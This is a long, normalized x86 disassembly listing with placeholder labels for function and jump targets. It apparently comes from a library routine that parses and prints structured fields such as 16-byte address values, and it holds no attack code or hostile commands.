jl r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x14c ]
push eax
push ecx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x24 ]
sub edi ebx
mov ebx [ esp + 0x144 ]
inc edi
push edi
push ebx
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
push ebp
call sub_1002de70
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x30 ]
cmp eax ecx
jne r-xdata
mov esi [ esp + 0x14 ]
mov ebx [ esp + 0x1c ]
sub esi ebx
mov ebx [ esp + 0x14c ]
inc esi
push esi
push ebx
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
mov ebx [ esp + 0x18 ]
mov eax edi
cmp ebx eax
mov [ esp + 0x30 ] eax
mov edi 0x1
jl r-xdata
inc edi
push edi
push ebx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
dec eax
dec edx
test eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] edx
jge r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x34 ]
cmp eax ecx
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
sar edi 0x1
push ebp
push ecx
mov edx [ esp + edi * 4 + 0xc0 ]
push edx
push eax
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov ebx [ esp + 0x18 ]
mov eax esi
cmp ebx eax
mov [ esp + 0x34 ] eax
mov esi 0x1
jl r-xdata
inc esi
push esi
push ebx
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x144 ]
push ebx
push edx
shl edi 0x1
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
sar esi 0x1
push ebp
push ecx
mov edx [ esp + esi * 4 + 0x40 ]
push edx
push eax
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
xor edi edi
mov [ esp + 0x20 ] edi
mov edx [ esp + 0x14c ]
push ebx
push edx
shl esi 0x1
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x30 ]
dec ebx
cmp ebx eax
jge r-xdata
inc edi
xor esi esi
mov [ esp + 0x20 ] esi
mov eax [ esp + 0x34 ]
dec ebx
cmp ebx eax
jge r-xdata
inc esi
sub_1005f030
mov eax 0x10
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
push r--data
xor edi edi
call sub_10033120
mov ebx eax
add esp 0x4
test ebx ebx
mov [ esp + 0x10 ] ebx
je r-xdata
push 0x91
push r--data
push 0x41
push 0x93
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x2c ]
xor ebp ebp
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esp + 0x2c ]
push ebp
push ecx
call sub_1001e7c0
mov esi eax
push 0x9
push r--data
mov edx [ esi + 0x4 ]
push edx
call strncmp
add esp 0x14
test eax eax
jne r-xdata
test edi edi
je r-xdata
push r--data
push ebx
call sub_10033840
add esp 0x8
mov eax [ esi + 0x4 ]
push 0x8
push r--data
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
mov cl [ eax + 0x9 ]
test cl cl
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
push r--data
push edi
call sub_10033840
add esp 0x8
push 0x80
push r--data
push 0x8f
push 0x93
push 0x22
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esi + 0x4 ]
mov cl [ eax + 0x8 ]
test cl cl
je r-xdata
add eax 0xa
jmp r-xdata
add ebx 0x4
add eax 0x9
mov [ esp + 0x18 ] eax
mov ecx [ esi + 0x8 ]
push r--data
mov [ esp + 0x20 ] ecx
call sub_10033120
mov ecx [ esp + 0x28 ]
mov edi eax
mov eax [ esp + 0x2c ]
lea edx [ esp + 0x18 ]
push 0x1
push edx
mov edx [ edi ]
push eax
push ecx
push edx
call sub_10051650
add esp 0x18
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
call sub_1001e3c0
mov [ ebx ] eax
mov ebx [ esp + 0x10 ]
push edi
push ebx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
xor edi edi
push eax
inc ebp
call sub_1001e7b0
mov ebx [ esp + 0x14 ]
add esp 0x4
cmp ebp eax
jl r-xdata
sub_1005f1d0
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov ebp [ eax ]
push edi
push ebp
call sub_1001e7b0
mov esi [ esp + 0x20 ]
add esp 0x4
test eax eax
jle r-xdata
xor edi edi
push ebp
mov [ esp + 0x20 ] edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esp + 0x20 ]
push r--data
push rw-data
push ecx
push r--data
push esi
call sub_10026b40
add esp 0x14
mov eax [ esp + 0x18 ]
mov ebx [ eax + 0x4 ]
push ebx
mov [ esp + 0x1c ] ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push edi
push ebp
call sub_1001e7c0
mov edx [ esp + 0x28 ]
mov edi eax
push rw-data
lea eax [ edx + 0x2 ]
push eax
push r--data
push esi
call sub_10026b40
mov eax [ edi ]
add esp 0x18
cmp [ eax ] 0x7
jne r-xdata
push ebx
xor ebp ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ esp + 0x20 ]
push r--data
push rw-data
push ecx
push r--data
push esi
call sub_10026b40
add esp 0x14
push eax
push esi
call sub_10050fb0
mov eax [ eax + 0x4 ]
push r--data
push esi
mov edi [ eax + 0x8 ]
mov ebx [ eax ]
call sub_10020a80
add esp 0x8
cmp ebx 0x8
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edx [ esp + 0x20 ]
add edx 0x2
mov [ esp + 0x20 ] edx
cmp ebx 0x20
jne r-xdata
xor eax eax
xor ecx ecx
mov al [ edi + 0x7 ]
mov cl [ edi + 0x6 ]
push eax
xor edx edx
mov dl [ edi + 0x5 ]
push ecx
xor eax eax
xor ecx ecx
mov al [ edi + 0x4 ]
mov cl [ edi + 0x3 ]
push edx
push eax
xor edx edx
push ecx
mov dl [ edi + 0x2 ]
xor eax eax
mov al [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
push edx
push eax
push ecx
push r--data
push esi
call sub_10026b40
add esp 0x28
jmp r-xdata
push eax
push esi
call sub_10050fb0
add esp 0x8
mov eax [ eax + 0x4 ]
push r--data
push esi
mov edi [ eax + 0x8 ]
mov ebx [ eax ]
call sub_10020a80
add esp 0x8
cmp ebx 0x8
jne r-xdata
push r--data
push esi
call sub_10026b40
jmp r-xdata
xor ebx ebx
mov edi [ esp + 0x1c ]
push edi
push ebp
call sub_1001e7c0
push r--data
push esi
call sub_10020a80
inc edi
push ebp
mov [ esp + 0x30 ] edi
call sub_1001e7b0
add esp 0x14
cmp edi eax
jl r-xdata
push ebp
push ebx
call sub_1001e7c0
mov edi eax
mov eax [ esp + 0x28 ]
push rw-data
push eax
push r--data
push esi
call sub_10026b40
mov eax [ edi ]
add esp 0x18
cmp [ eax ] 0x7
jne r-xdata
cmp ebx 0x20
jne r-xdata
xor ecx ecx
xor edx edx
mov cl [ edi + 0x7 ]
mov dl [ edi + 0x6 ]
push ecx
xor eax eax
mov al [ edi + 0x5 ]
push edx
xor ecx ecx
xor edx edx
mov cl [ edi + 0x4 ]
mov dl [ edi + 0x3 ]
push eax
push ecx
xor eax eax
push edx
mov al [ edi + 0x2 ]
xor ecx ecx
mov cl [ edi + 0x1 ]
xor edx edx
mov dl [ edi ]
push eax
push ecx
push edx
push r--data
push esi
call sub_10026b40
mov ebx [ esp + 0x40 ]
add esp 0x28
jmp r-xdata
add esp 0x8
cmp ebx 0xf
je r-xdata
push r--data
jmp r-xdata
push r--data
push esi
call sub_10026b40
mov ebx [ esp + 0x20 ]
add esp 0x8
jmp r-xdata
xor ebx ebx
push ebp
push ebx
call sub_1001e7c0
push r--data
push esi
call sub_10020a80
push ebx
inc ebp
call sub_1001e7b0
add esp 0x14
cmp ebp eax
jl r-xdata
inc ebx
cmp ebx 0x10
jl r-xdata
push rw-data
push esi
call sub_10020a80
add esp 0x8
cmp ebx 0xf
je r-xdata
push r--data
jmp r-xdata
xor edx edx
mov dh [ edi ]
mov dl [ edi + 0x1 ]
push edx
push r--data
push esi
call sub_10026b40
add esp 0xc
add edi 0x2
cmp ebx 0x7
jne r-xdata
jmp r-xdata
inc ebx
cmp ebx 0x10
jl r-xdata
push rw-data
push esi
call sub_10020a80
add esp 0x8
xor eax eax
mov ah [ edi ]
mov al [ edi + 0x1 ]
push eax
push r--data
push esi
call sub_10026b40
add esp 0xc
add edi 0x2
cmp ebx 0x7
jne r-xdata
mov ebx [ esp + 0x18 ]
jmp r-xdata
sub_1005f4b0
push ebx
mov ebx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push edi
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
mov edi [ esp + 0x24 ]
add esp 0x10
mov eax [ edi ]
test eax eax
je r-xdata
push r--data
push esi
call sub_10026b40
push eax
push esi
call sub_10067ec0
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
add esp 0x8
push r--data
push esi
call sub_10020a80
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push ecx
push esi
call sub_100305b0
push r--data
push esi
call sub_10020a80
mov edx [ edi + 0x4 ]
add esp 0x28
mov eax [ edx + 0x4 ]
test eax eax
je r-xdata
push eax
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
add esp 0x14
sub_1005f560
mov eax 0x14
call sub_1001d0d0
mov eax [ esp + 0x20 ]
push ebx
push ebp
push esi
push edi
xor ebp ebp
push eax
mov [ esp + 0x24 ] ebp
mov [ esp + 0x14 ] ebp
mov [ esp + 0x1c ] ebp
mov [ esp + 0x18 ] ebp
call sub_100568e0
mov edi eax
xor esi esi
push edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x24 ] esi
call sub_1001e7b0
add esp 0x8
test eax eax
jle r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebp
jne r-xdata
push esi
push edi
call sub_1001e7c0
mov ebx eax
add esp 0x8
mov eax [ ebx + 0x4 ]
cmp eax ebp
je r-xdata
push eax
call sub_10022ae0
add esp 0x4
cmp eax 0x29b
je r-xdata
push 0x111
push r--data
push 0x9a
jmp r-xdata
push 0xe9
push r--data
push 0x99
push 0x9b
push 0x22
call sub_1001de60
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
jmp r-xdata
mov cl [ eax ]
cmp cl 0x40
je r-xdata
cmp [ esp + 0x14 ] ebp
je r-xdata
cmp eax 0x299
jne r-xdata
push 0x9b
push 0x22
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x10 ]
cmp eax ebp
je r-xdata
mov ecx [ esp + 0x2c ]
inc eax
push eax
push ecx
mov edi 0x1
call sub_1005e650
mov esi eax
add esp 0x8
cmp esi ebp
je r-xdata
cmp [ ebx + 0x8 ] ebp
je r-xdata
call sub_10036820
cmp eax ebp
mov [ esp + 0x20 ] eax
jne r-xdata
push 0x117
push r--data
push 0x9f
jmp r-xdata
mov eax [ esp + 0x18 ]
cmp eax ebp
je r-xdata
push eax
call sub_10030910
add esp 0x4
mov [ esp + 0x10 ] ebp
push 0xf5
push r--data
push 0x87
push 0x9b
push 0x22
call sub_1001de60
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
mov edi [ esp + 0x60 ]
add esp 0x30
jmp r-xdata
xor ebx ebx
cmp cl 0x40
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ ecx ] edx
mov edx [ esp + 0x14 ]
mov [ esp + 0x10 ] ebp
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov ecx [ esp + 0x18 ]
mov [ esp + 0x14 ] ebp
mov [ eax ] ecx
mov [ esp + 0x18 ] ebp
push 0x11e
push r--data
push 0x41
mov eax [ esp + 0x14 ]
cmp eax ebp
je r-xdata
push eax
call sub_1002eed0
add esp 0x4
mov [ esp + 0x18 ] ebp
mov edx [ esp + 0x2c ]
push esi
push edx
call sub_1005e6a0
add esp 0x8
cmp edi ebp
mov edi [ esp + 0x30 ]
je r-xdata
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
push edx
lea ecx [ esp + 0x14 ]
push eax
push ecx
push ebx
push esi
call sub_1001e7c0
add esp 0x8
push eax
call sub_1005f830
add esp 0x10
mov edi eax
inc ebx
cmp edi ebp
jne r-xdata
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push eax
lea edx [ esp + 0x14 ]
push ecx
push edx
push ebx
call sub_1005f830
add esp 0x10
test eax eax
je r-xdata
push sub_10056020
push edi
call sub_1001e730
mov eax [ esp + 0x28 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
push eax
call sub_1002ef90
add esp 0x4
mov [ esp + 0x14 ] ebp
jmp r-xdata
mov esi [ esp + 0x1c ]
jmp r-xdata
push esi
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jge r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x1c
jmp r-xdata
inc esi
push edi
mov [ esp + 0x20 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
sub_1005f830
mov eax 0x810
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x820 ]
push edi
mov [ esp + 0x14 ] 0x0
mov ebp [ esi + 0x4 ]
mov edi r--data
mov eax ebp
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi r--data
mov eax ebp
mov edi [ esp + 0x828 ]
cmp [ edi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov eax [ esi + 0x8 ]
push 0x0
push eax
call sub_10022b70
add esp 0x8
mov [ edi ] eax
test eax eax
jne r-xdata
push 0x55
push r--data
push 0x9b
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov edi r--data
mov eax ebp
mov eax [ esp + 0x82c ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x810
retn
push 0x5b
push r--data
push 0x6e
push 0x96
push 0x22
call sub_1001de60
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push ecx
push r--data
push edx
push r--data
push eax
jmp r-xdata
push 0x96
push 0x22
call sub_1001de60
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push eax
push r--data
push ecx
push r--data
push edx
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
push eax
push esi
call sub_10056890
add esp 0x8
test eax eax
jne r-xdata
push 0x64
push r--data
push 0x9d
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x810
retn
mov ebx [ esp + 0x830 ]
xor ebp ebp
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ edi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
push 0x6a
push r--data
push 0x9c
jmp r-xdata
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
mov eax [ esi + 0x8 ]
push 0x4
push r--data
push eax
call strncmp
add esp 0xc
test eax eax
jne r-xdata
call sub_1002ef80
test eax eax
mov [ ebx ] eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add edi 0x2
test cl cl
jne r-xdata
mov ecx [ esi + 0x8 ]
push 0x5
push r--data
push ecx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x8 ]
lea ecx [ esp + 0x10 ]
add edx 0x4
push ecx
push edx
call sub_10056f30
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov [ esp + 0x14 ] 0x1
push 0x78
push r--data
push 0x41
mov dl [ eax ]
mov bl [ edi ]
mov cl dl
cmp dl bl
jne r-xdata
mov ecx [ esi + 0x8 ]
push 0x5
push r--data
push ecx
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x8 ]
push r--data
add edx 0x5
push edx
call sub_1002a440
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x1c ] esi
jne r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov edx [ esp + 0x10 ]
push 0x86
push r--data
mov ecx [ eax ]
lea ecx [ edx + ecx + 0x1 ]
mov edx [ eax + 0x8 ]
push ecx
push edx
call sub_1001d540
mov ebp eax
add esp 0x10
test ebp ebp
je r-xdata
push 0xc4
push r--data
push 0x98
mov edi [ esi + 0x8 ]
or ecx 0xffffffff
add edi 0x5
push 0xb8
[ edi ]
mov eax [ ebx ]
push r--data
not ecx
dec ecx
mov [ esp + 0x18 ] ecx
mov edx [ eax ]
lea ecx [ ecx + edx + 0x1 ]
mov edx [ eax + 0x8 ]
push ecx
push edx
call sub_1001d540
mov ebp eax
add esp 0x10
test ebp ebp
je r-xdata
lea ecx [ esp + 0x20 ]
push 0x800
push ecx
push esi
call sub_10020930
mov edi eax
add esp 0xc
test edi edi
mov [ esp + 0x18 ] edi
jg r-xdata
push 0x97
jmp r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x810
retn
mov ecx [ ebx ]
push ecx
call sub_1002ef90
add esp 0x4
mov [ ebx ] 0x0
push 0xca
push r--data
push 0x41
jmp r-xdata
mov eax [ ebx ]
mov esi edi
mov [ eax + 0x8 ] ebp
mov eax [ ebx ]
mov ecx [ esp + 0x10 ]
jmp r-xdata
mov eax [ ebx ]
mov [ eax + 0x8 ] ebp
mov esi [ esi + 0x8 ]
mov eax [ ebx ]
mov ecx [ esp + 0x10 ]
add esi 0x5
mov eax [ ebx ]
push 0xa1
push r--data
mov edx [ eax ]
lea ecx [ edi + edx + 0x1 ]
mov edx [ eax + 0x8 ]
push ecx
push edx
call sub_1001d540
mov ebp eax
add esp 0x10
test ebp ebp
je r-xdata
jne r-xdata
push r--data
push 0x20
push 0x96
push 0x22
call sub_1001de60
mov eax [ esp + 0x838 ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push ecx
push r--data
push edx
push r--data
jmp r-xdata
push 0x96
push 0x22
call sub_1001de60
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push ecx
push r--data
push edx
push r--data
mov edi [ eax + 0x8 ]
mov edx [ eax ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx ]
mov ecx [ esp + 0x10 ]
mov edx [ eax ]
add edx ecx
mov [ eax ] edx
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
mov [ edx + eax ] 0x0
mov esi [ esp + 0x824 ]
test edi edi
jge r-xdata
mov eax [ ebx ]
mov ecx edi
lea esi [ esp + 0x20 ]
mov [ eax + 0x8 ] ebp
mov eax [ ebx ]
mov edi [ eax + 0x8 ]
mov edx [ eax ]
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx ]
mov ecx [ esp + 0x18 ]
mov esi [ esp + 0x1c ]
mov edx [ eax ]
add edx ecx
mov [ eax ] edx
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
mov [ edx + eax ] 0x0
jmp r-xdata
push 0x8
push esi
call sub_10020910
add esp 0x8
test eax eax
je r-xdata
push eax
push r--data
push 0x6
call sub_1001e1a0
add esp 0x30
test ebp ebp
jne r-xdata
push 0xaf
jmp r-xdata
sub_1005fcb0
push ebx
push esi
mov ebx [ esp + 0x18 ]
mov esi [ esp + 0x14 ]
push edi
mov edi [ esp + 0x14 ]
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
mov eax [ edi ]
push eax
push esi
call sub_10066ce0
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push rw-data
push ebx
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
je r-xdata
mov ecx [ edi + 0x4 ]
push ecx
push esi
call sub_10067ec0
add esp 0x8
test eax eax
je r-xdata
push 0x1
push r--data
push esi
call sub_100209d0
add esp 0xc
test eax eax
je r-xdata
mov edx [ edi + 0x8 ]
push edx
push esi
call sub_10066d80
add esp 0x8
test eax eax
je r-xdata
push 0x1
push r--data
push esi
call sub_100209d0
add esp 0xc
test eax eax
je r-xdata
push 0x1
push r--data
push esi
call sub_100209d0
add esp 0xc
test eax eax
jne r-xdata
sub_1005fdb0
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push rw-data
push eax
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
push ecx
push esi
call sub_10066d80
add esp 0x8
neg eax
sbb eax eax
pop esi
neg eax
retn
pop esi
retn
sub_1005fdf0
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push rw-data
push eax
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
push ecx
push esi
call sub_100305b0
add esp 0x8
neg eax
sbb eax eax
pop esi
neg eax
retn
pop esi
retn
sub_1005fe40
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
mov edx [ esp + 0x4 ]
mov eax [ edx ]
retn
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
mov ecx [ eax ]
mov esi [ eax + 0x8 ]
mov edi [ edx ]
mov ebx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax ]
mov esi [ edx ]
add esi ecx
pop edi
mov [ edx ] esi
mov eax [ eax ]
pop esi
pop ebx
retn
sub_1005fe80
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
call sub_1002ef80
mov edi eax
mov edi [ ebx ]
test edi edi
jne r-xdata
mov ecx [ esi ]
add ecx ebp
test ebx ebx
mov [ esi ] ecx
je r-xdata
test edi edi
je r-xdata
mov esi [ esp + 0x18 ]
mov ebp [ esp + 0x1c ]
push ebp
mov eax [ esi ]
push eax
push edi
call sub_10036a60
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov [ ebx ] edi
push 0xe2
push r--data
push 0x41
push 0x66
push 0x27
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
test ebx ebx
je r-xdata
push edi
call sub_1002ee10
add esp 0x4
cmp [ ebx ] edi
je r-xdata
sub_1005ff10
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push rw-data
push eax
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
jg r-xdata
mov ecx [ esp + 0xc ]
push 0x4
push ecx
push esi
call sub_10067fb0
add esp 0xc
xor edx edx
test eax eax
setg dl
mov eax edx
pop esi
retn
xor eax eax
pop esi
retn
sub_1005ff70
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x20 ]
push rw-data
push edi
push r--data
push esi
call sub_10026b40
add esp 0x10
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ebp [ esp + 0x18 ]
push 0x82031f
push 0x0
mov eax [ ebp ]
push eax
push esi
call sub_1005c970
add esp 0x10
test eax eax
jle r-xdata
mov ecx [ ebp + 0x4 ]
xor ebx ebx
push ecx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
lea edx [ edi + edi ]
mov [ esp + 0x20 ] edx
mov edx [ edi ]
push edx
push esi
call sub_100305b0
add esp 0x8
test eax eax
jle r-xdata
push r--data
push esi
call sub_10020a80
add esp 0x8
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
push eax
push esi
call sub_10050fb0
add esp 0x8
test eax eax
jle r-xdata
mov ecx [ ebp + 0x4 ]
inc ebx
push ecx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x4 ]
push ebx
push eax
call sub_1001e7c0
mov ecx [ esp + 0x28 ]
push rw-data
push ecx
push r--data
push esi
mov edi eax
call sub_10026b40
add esp 0x18
test eax eax
jle r-xdata
sub_10060060
mov eax 0x50
call sub_1001d0d0
push esi
push edi
mov edi [ esp + 0x60 ]
xor esi esi
push edi
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x64 ]
pop edi
pop esi
add esp 0x50
retn
push esi
push edi
call sub_1001e7c0
push eax
lea eax [ esp + 0x14 ]
push 0x50
push eax
call sub_10030590
lea ecx [ esp + 0x78 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push 0x0
call sub_10055f50
push edi
inc esi
call sub_1001e7b0
add esp 0x24
cmp esi eax
jl r-xdata
sub_100600c0
push ebx
push ebp
push esi
push edi
call sub_1001e3c0
mov ebp eax
test ebp ebp
jne r-xdata
mov ebx [ esp + 0x1c ]
xor edi edi
push ebx
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push 0x7d
push r--data
push 0x41
push 0x67
push 0x22
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push edi
push ebx
call sub_1001e7c0
mov esi eax
add esp 0x8
mov eax [ esi + 0x8 ]
test eax eax
jne r-xdata
push 0x0
push eax
call sub_10022b70
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
push sub_10030910
push ebp
call sub_1001e730
push 0x87
push r--data
push 0x6e
push 0x67
push 0x22
call sub_1001de60
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push eax
push r--data
push ecx
push r--data
push edx
push r--data
push 0x6
call sub_1001e1a0
add esp 0x38
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
push ebp
call sub_1001e6c0
push ebx
inc edi
call sub_1001e7b0
add esp 0xc
cmp edi eax
jl r-xdata
sub_100601b0
push ebp
mov ebp [ esp + 0xc ]
push esi
mov eax [ ebp ]
push eax
call sub_1002f4d0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push eax
inc eax
push eax
push rw-data
push ecx
push r--data
push edx
call sub_10026b40
mov eax [ ebp + 0x4 ]
xor esi esi
push eax
call sub_1001e7b0
add esp 0x20
test eax eax
jle r-xdata
pop esi
mov eax 0x1
pop ebp
retn
push ebx
push edi
mov ecx [ ebp + 0x4 ]
push esi
push ecx
call sub_1001e7c0
mov edi eax
mov edx [ edi ]
push edx
push 0x0
call sub_10056280
mov ecx [ esp + 0x2c ]
mov ebx eax
mov eax [ esp + 0x30 ]
push ebx
push rw-data
push eax
push r--data
push ecx
call sub_10026b40
push ebx
call sub_1001d740
mov edx [ edi + 0x4 ]
mov eax [ esp + 0x44 ]
push edx
push eax
call sub_10066ce0
mov ecx [ ebp + 0x4 ]
inc esi
push ecx
call sub_1001e7b0
add esp 0x34
cmp esi eax
jl r-xdata
pop edi
pop ebx
pop esi
mov eax 0x1
pop ebp
retn
sub_10060260
mov eax 0x4
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push esi
push edi
push ebx
mov [ esp + 0x10 ] 0x0
